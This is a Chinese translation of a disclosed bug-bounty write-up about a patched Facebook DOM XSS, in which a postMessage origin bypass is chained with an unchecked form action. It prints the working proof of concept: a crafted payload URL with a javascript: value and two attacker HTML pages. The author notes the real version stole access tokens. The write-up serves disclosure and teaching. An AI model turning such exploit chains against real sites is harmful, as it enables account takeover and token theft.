# 从postMessage跨域通信中发现的Facebook DOM XSS

阅读量 **236605**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-11-12 15:30:25

 **x**

##### 译文声明

本文是翻译文章，文章原作者 ysamm，文章来源：ysamm.com

原文地址：<https://ysamm.com/?p=493>

译文仅供参考，具体内容表达以及含义原文为准。

第一个bug允许恶意用户通过postMessage方法从facebook发送XSS跨域攻击。存在bug的页面将接受用户构造的请求参数，并使用提供的数据构造一个对象，该对象将与postMessage一起发送到已打开的窗口。然后，又发现了另一个bug，并与前一个bug相关联，这个bug是通过Eventlistener接收到的表单提交数据，它可以被构造成一个不安全的脚本。

## 1） 通过postMessage发送消息

存在漏洞的页面是 **<https://www.facebook.com/payments/redirect.php>**.
这个页面的响应(response)可以由许多参数控制。我发现了一个有趣的“类型”。如果这个参数从通常的“i”改为“rp”，它将使用postMessage与打开该页面的窗口通信（对于“i”，它将使用window.parent.paymentsFlows.processIFrame）。

![](https://ysamm.com/wp-content/uploads/2020/11/P1-768x73.png)

请注意，目标源设置为我们的.intern.facebook.com。从这一点我知道postMessage方法是针对Facebook员工的，或者只被他们使用。.intern.facebook.com域只对他们“完全”开放访问，不是Facebook的员工，它将重定向到www.facebook.com。  
我试图通过访问另一个域中的同一个页面alpha.facebook.com来绕过。万一我们的our.alpha.facebook.com/payments/redirect.php
，它会返回alpha.facebook.com作为postMessage的targetOrigin。与our.intern ,
our.alpha相反不会重定向到www开头的页面。注意our.alpha.facebook.com 域的内容与www.facebook.com
相同，允许消息传递到打开窗口(opener window
)，因为targetOrigin条件已经满足，并且会将消息发送到我们的alpha.facebook.com。

在这一点上，我知道我应该寻找EventListeners存在的页面，并且它接受facebook.com子域名作为消息源。

## 2） XSS

apps.facebook.com提供了Facebook Canvas应用.
如果你访问了一个应用程序，你会发现Facebook会在一个iframe中加载一个URL（以前是由应用程序所有者选择的），然后一个包含了参数的POST消息将被发送到这个URL，例如“signed_request”参数。  
追踪这个请求的来源，我发现页面加载了
[https://www.facebook.com/platform/page_proxy/？version=X](https://www.facebook.com/platform/page_proxy/%EF%BC%9Fversion=X)
，然后用postMessage向其发送消息（我后来发现，另一个研究人员以前也发现了一个严重的[bug](https://www.amolbaikar.com/facebook-oauth-framework-vulnerability/ "bug")）。

page_proxy页面包含以下代码：  
[https://ysamm.com/wp-content/uploads/2020/11/proxy-768×411.png](https://ysamm.com/wp-content/uploads/2020/11/proxy-768x411.png)

这个代码可以做两件事。它将通过postMessage将带有frameName的消息发送到任何源（该方法被Amol使用过，但现在通过检查frameName来修复）。第二件事是它将设置一个EventListener并等待消息。如果收到一条消息并且满足了所有条件，它将在根据消息中的数据设置其属性之后提交一个表单。  
表单构造（submitForm方法）的有趣之处在于表单的action属性直接设置为a.data.params.appTabUrl（消息中会收到这个值）。“appTabUrl”字符串中的URL没有检查是否以http/https开头，因此我们可以使用javascript来实现XSS！

构造满足所有条件的payload，如下所示：

    
    
    https://our.alpha.facebook.com/payments/redirect.php?type=rp&name=_self&params[appTabUrl]=javascript:alert(1);&params[signedRequest]=SIGNED_X&platformAppControllerGetFrameParamsResponse=1
    

OBJ:
{“type”:”rp”,”name”:”_self”,”params”:{“appTabUrl”:”javascript:alert(1);”,”signedRequest”:”SIGNED_X”},”platformAppControllerGetFrameParamsResponse”:”1″}

###  Exploit

目标应该访问的网站包含以下代码。这将打开另一个页面，当前窗口将是打开窗口对象(opener window)。

    
    
    <html>
    <button class="button" onClick="window.open('https://attacker/page2.html', '_blank');document.location.href = 'https://our.alpha.facebook.com/platform/page_proxy/?version=X#_self';">
    <span class="icon">Start Attack</span>
    </button>
    </html>
    

这里我们不会直接重定向到page_proxy页面，因为我们需要设置一个超时来确保<https://www.facebook.com/platform/page_proxy/>
已加载。

page2.html:

    
    
    <html>
    <script>
    setTimeout(function(){ window.location.href = 'https://our.alpha.facebook.com/payments/redirect.php?type=rp&merchant_group=86&name=_self&params[appTabUrl]=javascript:alert(1);&params[signedRequest]=SIGNED_X&platformAppControllerGetFrameParamsResponse=1';} ,3000);
    </script>
    </html>
    

在这里，我们在3S延时之后重定向到存在漏洞的页面。这只会执行alert(1)
，但是我发送的POC会窃取访问令牌，该令牌可用于接管Facebook帐户。这很简单，因为我们可以简单地读取oauth流的响应来授权Facebook应用程序。

## 修复

Facebook修复了这个错误，完全删除了postMessage在 ( /payments/redirect.php)的重定向.
并且，appTabUrl会检查是否意https开头[ /^https:/.test(a.data.params.appTabUrl) ]

## 时间轴

2020年10月10日-发送报告

2020年10月10日——Facebook承认

2020年10月10日-总计2.5万美元，包括Facebook发放的奖金（2020年奖金期间）

2020年10月28日- 由Facebook修复

本文翻译自ysamm.com [原文链接](https://ysamm.com/?p=493)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **HelloWorld** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/222278](/post/id/222278)

安全客 - 有思想的安全新媒体

本文转载自: [ysamm.com](https://ysamm.com/?p=493)

如若转载,请注明出处： <https://ysamm.com/?p=493>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Web安全](/tag/Web安全)

 **+1** __3赞

 __收藏

![](https://thirdwx.qlogo.cn/mmopen/vi_32/MRL7MicQcb9FMwAfl4PuXOClsqXRFX1XsRsTIYBF1sEoVqbPRAsXMU5PtWb3WibIJibI8oPXUwXgPemeMw0CaAuibw/132)
HelloWorld

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

